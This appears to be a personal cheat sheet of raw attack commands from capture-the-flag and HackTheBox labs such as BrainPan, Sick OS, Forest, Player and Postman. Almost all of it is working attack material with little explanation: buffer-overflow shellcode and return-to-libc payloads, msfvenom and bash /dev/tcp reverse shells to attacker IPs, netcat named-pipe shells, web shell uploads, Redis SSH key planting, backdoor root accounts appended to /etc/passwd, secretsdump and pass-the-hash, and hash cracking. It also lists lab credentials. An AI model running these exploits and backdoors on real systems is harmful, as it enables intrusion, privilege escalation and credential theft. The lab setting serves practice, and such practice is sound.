export PATH=/tmp
./sky



BrainPan 1
===============================================
nmap -sC -sV -A -p- 192.168.56.104
dirb http://192.168.56.104:10000
wget http://192.168.56.104:10000/bin/brainpan.exe
file brainpan.exe
wine brainpan.exe
//download brainpan.exe open with immunity debugger
msf-pattern-create -l 600
msf-pattern_offset -q 0x76576123
//find JMP ESP in immunity debugger with right click>search for>command>JMP ESP
objdump -M intel -d brainpan.exe | grep "jmp.*esp"
msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.56.105 LPORT=1234 -f -c -a x86 --platform linux -b "\x00" -e x86/shikata_ga_nai
pat=A*524
ret= value JMP ESP
nops \x90*10
s.send(pat+ret+nops+shellcode)
//create handler in metasploit
msfconsole
use exploit/multi/handler
jobs
set payload linux/x86/shell/reverse_tcp
set LHOST 192.168.56.105
set LPORT 1234
run
nc -lvp 1234
bash -i
bash -i >& /dev/tcp/192.168.56.105/4321 0>&1
cp /usr/local/bin/validate /home/puck/web/bin
wget http://192.168.56.104:10000/bin/validate
gdb -q validate
msf-pattern-create -l 200
msf-pattern_offset -q 0x9712uqw
objdump -M intel -d validate | grep "call.*eax"
shellcode(28)+nops(116-28)+calleax		//shellcode: http://shell-storm.org/shellcode/files/shellcode-811.php
validate `python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + ("\x41" * 88) + "\xaf\x84\x04\x08"'`
sudo -l
mv anansi_util anansi_util.bck
cp /bin/bash ./anansi_util
sudo -S anansi_util
which ssl
ssl passwd godmode
echo 'rooot:w0cHJ.a5mvNYKk:0:0:root:/root:/bin/bash' >> /etc/passwd






Smash The Tux
=======================================
0x00 strcpy()--------------------------
uname --m
hostnamectl
lsb-release -a
uname --m > cname && hostnamectl >> cname && lsb-release -a >> cname
scp -r /home/user/peda tux@192.168.2.125:/home/tux
(gdb) checksec
msfvenom -p linux/x86/exec CMD=/bin/bash -f python -b \x00'
objdump -M intel -d pwdnme | grep "call.*eax"
print shell+nops(268-len(shell))+eax

0x01 printf()-------------------------
for i in {1..200};do echo "trying offset $i - `echo "DDDD%$i\\$08x" | ./pwnme`"; done | grep DDDD44444444

0x02 if(stat)-----------------------------
//race conditions
//https://www.win.tue.nl/~aeb/linux/hh/hh-9.html
#!/bin/sh
touch myfile
while true; do
  ln -sf ./myfile a &
  ./pwnme a &
  ln -sf .readthis a &
done
./explout.sh

0x03 strcpy()----------------------------
gdb -q ./pwnme core

0x04 fopen()-----------------------------
ln -s /bin/sh r
PATH=.:$PATH ./pwnme payload

0x05 system()----------------------------
echo 'sh' > ls && chmod +x ls
PATH=.:$PATH ./pwnme

0x06 sprintf()&puts()--------------------
run `python -c 'print "%76xAAAA"'`
p system
run `python -c 'print "%76x\xe0\x43\xe6\xb7"'`
p exit
//find /bin/bash
//rettolibc
%76x+system+exit+/bin/bash

0x07 malloc()&strcpy()-------------------
payload = "sh;#" # The command we want to execute
payload += "A" * 16 # Padding to reach the pointer for the second instances name property
payload += "\x88\x97\x04\x08" # The address for the GOT entry of the strcpy function
payload += " " # End of argument the first
payload += "\xe0\x43\xe6\xb7" # Address of __libc_system - overwriting the GOT entry of the strcpy function
payload += "\x26\x83\x04\x08" # Original address of GOT entry of the malloc function
payload += "\x36\x83\x04\x08" # Original address of the GOT entry of the __gmon_start__ function
payload += "\xb9\x84\x04\x08" # Address of main+94 - overwriting the GOT entry of the exit function





Stack Overflows for Beginners: 1.0.1
=======================================
./levelOne `python -c 'print "A"*100'`
ldd levelTwo | grep libc
sysctl kernel.randomize_va_space
gdb -q ./levelTwo
(gdb) checksec
(gdb) vmmap
(gdb) r `python -c 'print "A"*36+"BBBB"'`
(gdb) p system
(gdb) searchmem /bin/sh
(gdb) searchmem exit
-----------level2--------------
./levelTwo `python -c 'print "A"*36+"\x80\xc9\xe0\xf7"+"BBBB"+"\x08\x70\x55\x56"'`
gdb -q ./levelTwo
(gdb) info functions
(gdb) pd spawn
//find execve@plt execute something maybe shell
./leveltwo `python -c 'print "A"*36+"\xc9\x61\x55\x56"'`
----------level3--------------
gdb -q ./levelThree
(gdb) vmmap
(gdb) r `python -c 'print "A"*268+"BBBB"'`
(gdb) p system
(gdb) searchmem /bin/sh
(gdb) searchmem exit
./levelThree `python -c 'print "A"*268+"\x80\xc9\xe0\xf7"+"BBBB"+"\xaa\xca\xf4\xf7"'`
gdb -q ./levelThree
(gdb) info proc map
objdump -M intel -D /usr/lib32/libc-2.28.so | grep "jmp.*esp"
(gdb) x/s 0xf7dc9000 + 6ff7
-----------level5-------------
pip install pwntools





Sick OS 1.2
==================================================
dirb http://10.1.1.8
nmap --script http-methods --script-args http-methods.url-path='/website' <target>
curl -X OPTIONS http://10.1.1.8/test -v
curl http://10.1.1.8/test --upload-file p0wny.php --http1.0
curl -T p0wny.php http://10.1.1.8/test/ --http1.0
mknod /tmp/pipe1 p
/bin/sh 0</tmp/pipe1 | nc 10.1.1.5 443 1>/tmp/pipe1
nc -lvp 443
curl -T LinEnum.sh http://10.1.1.8/test/ --http1.0
./LinEnum.sh >> linenum.txt
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.1.1.5 LPORT=443 -f raw > msfshell.php
msfconsole
> use exploit/multi/handler
> set payload php/meterpreter/reverse_tcp
> set LHOST 10.1.1.5
> set LPORT 443
> exploit -j
> sysinfo
> upload /root/Desktop/webshells/linexploit.sh
> shell
python -c 'import pty;pty.spawn("/bin/bash")'
//got cron chkrootkit
chkrootkit -V
searchsploit chkrootkit
echo "#!/bin/bash" > /tmp/update
echo 'echo "rooot:`openssl passwd -1 -salt ignite pass123`:0:0:root:/root:/bin/bash" >> /etc/passwd' >> /tmp/update
chown root:root /bin/sh ; chmod 4777 /bin/sh 		//setuid /bin/sh
su rooot											//pass pass123
/bin/sh



MyHouse 7
==================================
ifconfig enp0s3 up
dhclient -v enp0s3
/bin/bash -c 'bash -i >& /dev/tcp/10.1.1.5/4321 0>&1'
grep -ri "tryharder" /* 2>/dev/null
gzip -d mysql.tar.gz
tar -xvf mysql.tar
hydra -L user.txt -e nsr 10.1.1.9 ssh
scp  mysql.tar.xz admin@10.1.1.9:/tmp
./mysql -h 10.1.1.9 -u root -p
select load_file ("/etc/passwd");
ifconfig | grep inet
./nmap -sT 172.31.30.0/24
ssh -L 444:172.31.30.24:445 admin@10.1.1.9
ssh -L 139:172.31.30.24:139 admin@10.1.1.9
netstat -auntp
enum4linux 127.0.0.1 | tee enum
smbmap -H 127.0.0.1 -P 444 -u heather -p heather
smbclient //127.0.0.1/users -U heather -p 444
>dir
>get flag.txt
smbclient //127.0.0.1/users -U heather -p 444
>get Flag.txt
//how to conneect smb with file explore
other location > connect to server > smb://127.0.0.1:444/users > input user passwd
7z e moreinfo.7z
for i in $(seq 0 9); do echo {{tryharder:0$i}}; done >> wordlist
for i in $(seq 10 99); do echo $i && 7z e -p{{tryharder:$i}} moreinfo.7z; done >> wordlist
ssh -L 22222:172.31.20.194:24 admin@10.1.1.9
hydra -L user.txt -P pass.txt -s 22222 -e nsr 127.0.0.1 ssh
ssh -p 22222 root@127.0.0.1
grep -ri "tryharder" /* 2>/dev/null




Kioptrix 4
=====================================
Enum4Linux -a 10.1.1.10 | tee enumlinux
nmap --script smb-enum-users -iL 10.1.1.10 -oN nmapsmb
nmap --script smb-vuln* -p 445 10.1.1.10
find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
find / -perm -4777 -type f 2>/dev/null | xargs ls -laht
find / -perm -777 -type f 2>/dev/null | xargs ls -laht
locate udf
select * from mysql.func;
select sys_exec('usermod -a -G admin john');
select sys_exec('echo "rooot::0:0:root:/root:/bin/bash');
openssl passwd -1 -salt ignite pass123
mkpasswd -m SHA-512 pass
python -c 'import crypt; print crypt.crypt("pass", "$6$salt")'
perl -le 'print crypt("pass123", "abc")'
php -r "print(crypt('aarti','123') . \"\n\");"
ruby -r 'digest' -e 'puts "pass".crypt("$6$salt")'


HackInOS 0.1
===================================
wpcan --url http://localhost:8000 --enumerate u
dirb http://localhost:8000
for i in $(seq 0 101); do echo -n "php-reverse-shell.php$i" | md5sum | cut -d " " -f1; done | tee file
wfuzz -c -w file --hc 404 http://localhost:8000/uploads/FUZZ.php
nc -lvp 3434
python -c 'import pty;pty.spawn("/bin/bash")'
^Z
stty raw -echo
fg
reset
find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
tail -n 100 /etc/passwd > passwd.txt
tail -n 100 /etc/shadow > shadow.txt
unshadow passwd.txt shadow.txt > unshadow.txt
john unshadow.txt
su root




Metasploitable 3 windows
====================================
//jerkins
tcpdump -ni eth0 icmp
nmap --script vulscan -sV -p 8022 10.1.1.12
nmap --script vulscan --script-args vulscandb=exploitdb.csv -sV -p 8022 10.1.1.12
//manageengine desktop central 9
searchsploit manage engine desktop 9
>use exploit/windows/http/manageengine_connectionid_write
>set lhost 10.1.1.5
>set rhost 10.1.1.12
>exploit
>sysinfo
>shell
//wampserver
curl -T p0wny.php http://10.1.1.12:8585/uploads/
//elasticsearch
http://10.1.1.12:9200/metasploitable3/_search?pretty
curl -X GET http://10.1.1.12:9200/metasploitable3_search" -H 'Content-Type: application/json' -d
PUT http://10.1.1.12:9200/index/_doc/id
{
	"name" : "asd",
	"email" : "asd@asd",
	"address" : {
		"coutry" : "indog"
		"city" : "madman"
		},
	"hobby" : ["eat","shit"]},
}
http://10.1.1.12:9200/index/_doc/id
curl -X DELETE http://10.1.1.12:9200/index/_doc/id
curl -X POST http://10.1.1.12:9200/index/_update/id
{
	"name" : "asd",
}
http://10.1.1.12:9200/_cat/indices?v
http://10.1.1.12:9200/_search/
curl -X GET http://10.1.1.12:9200/index/_search
{
	"query" : {
		"match" : {
			"address.city" : "madman"
		}
	}
}
elasticdump



Forest HTB
===================================
git clone https://github.com/sensepost/UserEnum
./UserEnum_RPC.py 10.10.10.161 userlist.txt
rpcclinet -U"%" 10.10.10.161
rpcclient -U"" -N 10.10.10.161
rpcclinet?> ?
>enumdomusers
>enumdomgroups
enum4linux -a 10.10.10.161
GetNPUsers.py -dc-ip 10.10.10.161 -no-pass htb.local/
hashcat -m 18200 -a 0 -w 3 forest.hash /usr/share/wordlists/rockyou.txt --force
gem install evil-winrm
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
upload SharpHound.ps1 c:\temp\SharpHound.ps1
Import-module ./SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
net group "Exchange Windows Permissions" svc-alfresco /add
aclpwn -f svc-alfresco -t htb.local -d htb.local -s 10.10.10.161 -u svc-alfresco -p s3rvice
impacket/secretsdump.py -just-dc-ntlm HTB/svc-alfresco:s3rvice@10.10.10.161
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
type Users\Administrator\Desktop\root.txt




RE HTB
===================================
smbmap -H 10.10.10.144 -u 'anonymous' -p ''
smbclient //reblog.htb/malware_dropbox
>put nmap
>dir
//create malicious ODS file
msfconsole
use exploit/multi/misc/openoffice_document_macro
show options
set srvhost 10.10.15.59
set srvport 4343
exploit
cp /root/.msf4/local/msf.odt .msf.ods
cp msf.ods msf.ods.zip
unzip msf.ods.zip -d files/
//create virus
msfconsole
use payload/windows/x64/meterpreter/reverse_tcp
generate -f exe -i 3 -o virus.exe -p windows
zip -r malicious.ods.zip ./*




Player HTB
=====================================
searchsploit openssh 6.6
searchsploit -m 41136
wfuzz -c -f sub-fighter -w /wordlist/seclist/Deiscovery/DNS/subdomains-top1mil-5000.txt -u "http://chaos.htb" -H "Host: FUZZ.chaos.htb" -t 42 --hl 1
wfuzz -c -w /opt/SecLists/Discovery/DNS/subdomains.txt --hc 400,403,404 -H "Host: FUZZ.player.htb" -u http://player.htb -t 50
//list avaliable site addresses
	dev.player.htb
	chat.player.htb
	staging.player.htb
	player.htb/launcher/
http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.php~
//got source code how to encrypt
	'access_code' => 'C0B137FE2D792459F26FF763CCE44574A5B5AB03' ]; 
	$key = '_S0_R@nd0m_P@ss_'; 
	$jwt = JWT
//jwt.io how to decrypt JWT js, and access again with cookies access="jwt"
http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.php
http://player.htb/launcher/7F2dcsSdZo6nj3SNMTQ1/
//upload file and download it and play it
file 1438328879.avi
//https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS
python gen_avi_bypass.py file:///etc/passwd passwdavi
python gen_avi_bypass.py file:///var/www/backup/service_config srvconfgavi
//got credentials
    telegen
    d-bC|jC!2uepS/w
python gen_avi_bypass.py file:///etc/apache2/sites-enabled/000-default.conf apachecnfavi
ssh -o IdentitiesOnly=yes -l telegen 10.10.10.145 -p 6686
searchsploit ssh 7.2
searchsploit -m 39569
python 39569.py
python 39569.py player.htb 6686 telegen 'd-bC|jC!2uepS/w'
.readfile /var/www/staging/fix.php
//got credentials
	peter
	CQXpm\z)G5D#%S$y=
dev.player.htb
//login and create project under /var/www/demo/ athen upload p0wny.php and access it
dev.player.htb/languages/sr.php
mknod /tmp/pipe1 p
/bin/sh 0</tmp/pipe1 | nc 10.10.14.203 4343 1>/tmp/pipe1
nc -lvp 4343
wget http://10.10.14.203:8888/pspy64
chmod +x pspy64
./pspy64
cp /var/lib/playbuf/buff.php /var/www/html/demo/languages/buff.txt
wget dev.player.htb/languages/buff.txt
cp /var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php /var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php.bak
//cant download reverse shell because firewall
cat phpsh.php | base64 -w 0
echo '' >> /tmp/phpsh.b64
base64 -d /tmp/phpsh.b64 > /tmp/phpsh.php
cp /var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php /var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php.bak
cp /tmp/phpsh.php /var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php
nc -lvp 4334
cp /var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php.bak /var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php






Postman HTB
======================================
curl -ks
ssh-keygen -t rsa -f /root/.ssh/redis_ssh_key -q -N ""
(echo -n "\"\n\n"; cat /root/.ssh/redis_ssh_key.pub; echo -n "\n\n\"")
//redis RCE https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html
telnet 10.10.10.160 6379
>set key "//paste key and \n"
>config set dir /var/lib/redis/.ssh
>config set dbfilename authorized_keys
>save
>quit
ssh -o IdentitiesOnly=yes -l redis -i /root/.ssh/redis_ssh_key 10.10.10.160
find / -name "*.bak" -print -execdir ls -la {} \; 2>/dev/null
cat /opt/id_rsa.bak
python /usr/share/john/ssh2john.py matt_private_key.txt > matt_private_key.hash
//fix the format
nano matt_private_key.hash
john --wordlist=/usr/share/wordlists/rockyou.txt matt_private_key.hash
su Matt
ls -lah /var/www/
msfconsole
use exploit/linux/http/webmin_packagup_rce
>set rhost 10.10.10.160
>set lhost 10.10.12.120
>set ssl true
>set username Matt
>set password computer2008
>exploit
echo "rooot:`openssl passwd -1 -salt ignite pass123`:0:0:root:/root:/bin/bash
ssh rooot@10.10.10.160
//change format passwd and shadow
//reference shadow: https://www.cyberciti.biz/faq/understanding-etcshadow-file/
nano /etc/shadow
nano /etc/passwd



GitLab HTB
====================================
http://10.10.10.144/robots.txt
http://10.10.10.144/help/bookmarks.html
	//open gitlab login in source, there is javascript bookmark for login in hex
	//decode hex in python or here: http://ddecode.com/hexdecoder/
	//upload file than merge and get shell
	//open snippet and get database creds
sudo -l
cp -r /var/www/html/profile /tmp/.whops/
echo "#!/bin/bash" > .git/hooks/post-merge
echo 'echo "rooot:`openssl passwd -1 -salt ignite godmode`:0:0:root:/root:/bin/bash" >> /etc/passwd' >> .git/hooks/post-merge
	//merge something on profile to get pull
	//reference post-merge: https://www.liquidlight.co.uk/blog/using-a-post-merge-git-hook-to-clean-up-old-branches/
sudo git pull
cat /etc/passwd
su rooot
	//normal chalenge
ip neigh
time for i in {1..254}; do (ping -c 1 172.19.0.$i | grep "bytes from" | cut -d':' -f1 | cut -d' ' -f4 &); done
nmap  172.19.0.2-5
php -a
> $connection = new PDO('pgsql:host=localhost;dbname=profiles', 'profiles', 'profiles');
> $result = $connection->query("SELECT * FROM profiles");
> $profiles = $result->fetchAll();
> print_r($profiles);
	//got creds
	clave
    c3NoLXN0cjBuZy1wQHNz==
ssh clave@10.10.10.144
scp clave@10.10.10.144:/home/clave/RemoteConnection.exe .
file RemoteConnection.exe
	//open with immunity debugger
search for > all reference text string > open location "Access Denied"
set location right before it > breakpoint > toggle > run
	//check stings on right bottom
	//got creds
	root
	Qf7]8YSV.wDNF*[7d?j&eD4^
ssh root@10.10.10.144






Root exec()
===================================
usermod -a -G admin user1								//in case u have user1 passwd
echo "rooot::0:0:root:/root:/bin/bash" >> /etc/passwd
chown root:root /bin/sh ; chmod 4777 /bin/sh
/bin/bash -c 'bash -i >& /dev/tcp/10.1.1.5/4321 0>&1'


===========================================================================

//no redirect with curl -v
//program bin exploit:https://gtfobins.github.io
//linux enumeration:https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

//jquery vulner file upload
jquery-file-upload/server/php/
curl -F "files=@hex.php" http://local.linuxsec.org/labs/jQuery-File-Upload-9.22.0/server/php/ -v
    http://localhost//labs//jQuery-File-Upload-9.22.0//server//php//files//hex.php
	
cat /opt/LinEnum/LinEnum.sh | base64 -w 0 | xclip -selection primary
//paste in target with middle mouse click
base64 -d linenum.b64 > linenum.sh

curl -X OPTIONS -v http://192.168.126.129/test/
fuzzing github https://github.com/danielmiessler/SecLists/tree/master/Fuzzing
https://www.exploit-db.com/docs/english/47032-buffer-overflows,-c-programming,-nsa-ghidra-and-more.pdf

//disable ASLR
sudo sysctl -w kernel.randomize_va_space=0
    0 = Disablabed
    1 = Conservative Randomization
    2 = Full Randomization
	
chmod 4755 file (set setuid)
grep -o x /tmp/etcpasswd | wc -l
			//count exact word
ps -xaf		

exiftool
binwalk -W	

http response 201 created

echo "rooot:`openssl passwd -1 -salt ignite godmode`:0:0:root:/root:/bin/bash

echo -e "task goes here\n$(cat todo.txt)" > todo.txt
